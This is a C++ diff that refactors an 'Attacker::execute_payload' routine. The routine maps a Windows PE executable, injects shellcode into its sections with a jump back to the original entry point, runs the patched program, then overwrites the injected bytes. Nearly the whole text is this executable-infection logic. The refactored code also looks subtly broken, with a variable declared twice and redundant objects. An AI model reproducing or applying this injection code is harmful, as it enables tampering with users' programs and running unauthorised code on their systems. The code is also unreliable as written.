@@ -12,47 +12,17 @@ void Attacker::execute_payload()
 	std::string f_n = file_name.u8string();
 	LPCSTR lpApplicationName = f_n.c_str();
 
-    auto file_handle = CreateFile(file_name.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (!file_handle)
-    {
-        EXIT_FAILURE;
-    }
-    auto file_size = GetFileSize(file_handle, NULL);
-    if (file_size == 0)
-    {
-        EXIT_FAILURE;
-    }
 
-    auto file_mapping = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0, file_size, NULL);
-    if (!file_mapping)
-    {
-        std::cout << "file_mapping not found";
-        EXIT_FAILURE;
-    }
+    PE::PE_file p_f(file_name);
+    
 
-    auto file_map_view = reinterpret_cast<LPBYTE>(MapViewOfFile(file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, file_size));
-    if (!file_map_view)
-    {
-        std::cout << "file_map_view not found";
-        EXIT_FAILURE;
-    }
+    PE::PE_file pe_file(file_name);
 
-    auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(file_map_view);
-    if (!dos_header)
-    {
-        std::cout << "dos_header not found";
-        EXIT_FAILURE;
-    }
-    //pomoci e_lfanew se dostaneme k NT hlavicce
-    auto nt_header = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(dos_header) + dos_header->e_lfanew);
-
-    if (!nt_header)
-    {
-        std::cout << "NT header not found";
-        EXIT_FAILURE;
-    }
-
-    DWORD index = 0;
+    pe_file.map_file();
+    pe_file.parse_file();
+    auto first_section_header = pe_file.get_first_header();
+    auto original_entry_point = pe_file.get_oep();
+    auto nt_header = pe_file.get_nt_header();
 
     auto original_entry_point = (nt_header->OptionalHeader.AddressOfEntryPoint);
 
@@ -60,6 +30,10 @@ void Attacker::execute_payload()
 
     PIMAGE_SECTION_HEADER current_section = first_section_header;
     PIMAGE_SECTION_HEADER next_section;
+    
+    auto file_map_view = pe_file.get_file_map_view();
+
+    DWORD index = 0;
 
     for (int i = 0; i < nt_header->FileHeader.NumberOfSections - 2; i++)
     {
@@ -106,9 +80,7 @@ void Attacker::execute_payload()
 
     memcpy(&file_map_view[index + size_of_shellcode_full + index_end], &jojo, sizeof(jojo));
 
-    CloseHandle(file_mapping);
-    CloseHandle(file_handle);
-    UnmapViewOfFile(file_map_view);
+    pe_file.freeFile();
 
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
@@ -135,40 +107,21 @@ void Attacker::execute_payload()
     CloseHandle(pi.hThread);
 
 
+    while (PE::PE_file::is_file_running(file_name))
+    {
+        Sleep(5000);
+    }
     system("pause");//NAHRADIT KONTROLOU ZDA JE PROGRAM STALE ZAPLY
 
 
-    file_handle = CreateFile(file_name.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (!file_handle)
-    {
-        EXIT_FAILURE;
-    }
-    file_size = GetFileSize(file_handle, NULL);
-    if (file_size == 0)
-    {
-        EXIT_FAILURE;
-    }
-
-    file_mapping = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0, file_size, NULL);
-    if (!file_mapping)
-    {
-        std::cout << "file_mapping not found";
-        EXIT_FAILURE;
-    }
-
-    file_map_view = reinterpret_cast<LPBYTE>(MapViewOfFile(file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, file_size));
-    if (!file_map_view)
-    {
-        std::cout << "file_map_view not found";
-        EXIT_FAILURE;
-    }
+    PE::PE_file pe_process(file_name);
+    pe_process.map_file();
+    file_map_view = pe_process.get_file_map_view();
 
     memcpy(&file_map_view[index + size_of_shellcode_full + index_end], "\xc3", sizeof "\xc3");
     memcpy(&file_map_view[index + size_of_shellcode_full + index_end + sizeof "\xc3" - 1], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");
 
-    CloseHandle(file_mapping);
-    CloseHandle(file_handle);
-    UnmapViewOfFile(file_map_view);
+    pe_process.freeFile();
 }
 
 
